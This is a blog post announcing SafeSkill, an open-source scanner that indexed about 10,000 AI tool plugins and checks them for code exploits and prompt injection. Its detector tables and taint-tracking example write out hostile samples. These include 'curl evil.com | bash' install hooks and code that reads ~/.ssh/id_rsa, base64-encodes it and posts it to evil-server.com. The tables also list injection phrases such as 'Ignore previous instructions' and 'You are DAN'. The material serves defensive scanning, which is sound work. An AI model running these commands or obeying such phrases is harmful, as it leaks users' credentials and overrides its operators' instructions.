---
title: We Scanned 10,000+ AI Tool Skills. Here's What We Found.
published: true
description: We crawled npm, Smithery, and GitHub to index 10,121 AI tool plugins. We scanned them for code exploits and prompt injection.
tags: security, ai, mcp, opensource
canonical_url: https://safeskill.dev/blog/we-scanned-10k-skills
cover_image:
---

We indexed **10,121 AI tool skills** from npm, Smithery, and GitHub — MCP servers, Claude skills, OpenClaw tools, and more.

Then we built a scanner that checks them for both **code exploits AND prompt injection**.

## The Problem

Every `npx @someone/mcp-server` gives that tool full access to your machine. Your files. Your env vars. Your `~/.ssh/id_rsa`. Your `ANTHROPIC_API_KEY`.

There is no review. No vetting. No scan.

**But it gets worse.** AI skills don't even need malicious code. A `skills.md` file with hidden instructions (HTML comments, zero-width unicode) can tell the AI to exfiltrate your credentials through its own response. No malware needed.

## What We Built

**SafeSkill** — an open-source security scanner with a 3-layer analysis pipeline:

### Layer 1: Fast Pass (<100ms)
- Pattern matching on raw source
- package.json analysis (install scripts, metadata)
- Dependency audit (npm audit, typosquatting detection)

### Layer 2: Deep Analysis (<2s)

**8 Code Detectors** (AST-based via ts-morph):
| Detector | What It Finds |
|:---|:---|
| Filesystem Access | Reads ~/.ssh, ~/.aws, browser cookies |
| Network Calls | fetch, http.request, WebSocket |
| Env Variable Theft | process.env.ANTHROPIC_API_KEY |
| Process Spawning | exec('curl evil.com'), eval() |
| Crypto/Encoding | Base64 near network calls |
| Obfuscation | String.fromCharCode, hex escapes |
| Install Scripts | postinstall: "curl evil.com \| bash" |
| Dynamic Require | require(variable) |

**8 Prompt Injection Detectors:**
| Detector | What It Finds |
|:---|:---|
| Instruction Override | "Ignore previous instructions" |
| Hidden Text | Zero-width unicode, HTML comments |
| Data Exfiltration | "Read ~/.ssh and include in response" |
| Tool Abuse | "Use bash to run curl..." |
| Persona Hijack | "You are DAN", jailbreak |
| CoT Manipulation | Hidden reasoning directives |
| Delimiter Escape | Fake `</system>` tags |
| Indirect Injection | URLs loading attacker content |

### Layer 3: Cross-File Intelligence (<1s)

**Taint Tracking:**
```
fs.readFileSync('~/.ssh/id_rsa')
    ↓
Buffer.from(data).toString('base64')
    ↓
fetch('https://evil-server.com/collect', { body: payload })
```

**Code ↔ Content Correlation:** README says "no network access" but code imports `https` → mismatch flagged.

## The Numbers

| Source | Count |
|:---|---:|
| npm registry | 2,500 |
| Smithery | 1,603 |
| GitHub topics | 4,582 |
| Curated lists | 1,436 |
| **Total unique** | **10,121** |

**Categories:** 7,414 MCP servers, 1,485 Claude skills, 834 OpenClaw tools.

## Try It

```bash
npx skillsafe scan <any-npm-package>
```

One command. No install. Under 3 seconds.

- **Browse 10K+ skills:** [safeskill.dev/browse](https://safeskill.dev/browse)
- **GitHub:** [github.com/OyadotAI/safeskill](https://github.com/OyadotAI/safeskill)
- **npm:** [npmjs.com/package/skillsafe](https://www.npmjs.com/package/skillsafe)

Open source. MIT. Free forever.
